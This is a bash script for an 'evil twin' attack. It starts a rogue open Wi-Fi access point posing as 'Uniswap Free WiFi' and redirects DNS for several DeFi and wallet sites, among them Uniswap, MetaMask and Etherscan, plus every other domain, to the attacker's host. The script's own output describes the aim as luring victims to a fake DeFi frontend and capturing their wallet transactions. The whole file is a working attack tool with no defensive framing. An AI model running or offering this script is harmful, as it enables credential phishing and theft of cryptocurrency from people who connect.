#!/bin/bash
# ═══════════════════════════════════════════
# N7 EVIL TWIN — Deploy Fake WiFi Access Point
# ═══════════════════════════════════════════

IFACE="wlx8c86ddf8fe26"
FAKE_SSID="Uniswap Free WiFi"
CHANNEL=6

echo "═══ N7 EVIL TWIN AP ═══"
echo "  Interface: $IFACE"
echo "  SSID:      $FAKE_SSID"
echo "  Channel:   $CHANNEL"
echo "  IP Range:  10.0.0.0/24"
echo ""

# Kill any interfering services
killall dnsmasq hostapd 2>/dev/null
sleep 1

# Configure interface
ip link set $IFACE down
ip addr flush dev $IFACE
ip addr add 10.0.0.1/24 dev $IFACE
ip link set $IFACE up

echo "[1/4] Interface configured: 10.0.0.1/24"

# Create hostapd config for open network
cat > /tmp/n7_hostapd.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$FAKE_SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wmm_enabled=0
EOF

echo "[2/4] hostapd config created"

# Create dnsmasq config — DHCP + DNS spoofing
cat > /tmp/n7_dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

# DNS spoofing: ALL DeFi domains → our trap
address=/app.uniswap.org/10.0.0.1
address=/uniswap.org/10.0.0.1
address=/pancakeswap.finance/10.0.0.1
address=/sushi.com/10.0.0.1
address=/1inch.io/10.0.0.1
address=/aave.com/10.0.0.1
address=/compound.finance/10.0.0.1
address=/curve.fi/10.0.0.1
address=/metamask.io/10.0.0.1
address=/etherscan.io/10.0.0.1
address=/opensea.io/10.0.0.1

# Wildcard redirect (everything else goes to us too)
address=/#/10.0.0.1
EOF

echo "[3/4] dnsmasq config created (13 DeFi domains spoofed)"

# Enable IP forwarding + NAT (so victims get real internet for non-DeFi)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -t nat -A POSTROUTING -o wlx8c86ddf8fe26 -j MASQUERADE
iptables -F FORWARD
iptables -A FORWARD -i $IFACE -j ACCEPT

echo "[4/4] NAT + forwarding enabled"

# Start services
echo ""
echo "Starting hostapd..."
hostapd /tmp/n7_hostapd.conf &
sleep 2

echo "Starting dnsmasq..."
dnsmasq -C /tmp/n7_dnsmasq.conf -d &
sleep 1

echo ""
echo "═══ EVIL TWIN ACTIVE ═══"
echo "  SSID:     $FAKE_SSID"
echo "  Clients:  waiting..."
echo "  Trap:     http://10.0.0.1:8080/"
echo ""
echo "Victims connect → DNS resolves to us → DeFi frontend → Wallet connect → TX captured"
echo ""

# Monitor connected clients
while true; do
    CLIENTS=$(arp -a -i $IFACE 2>/dev/null | grep -v "incomplete" | wc -l)
    if [ "$CLIENTS" -gt 0 ]; then
        echo -e "\n[$(date +%H:%M:%S)] ⚡ $CLIENTS client(s) connected!"
        arp -a -i $IFACE 2>/dev/null | grep -v "incomplete"
    fi
    sleep 10
done
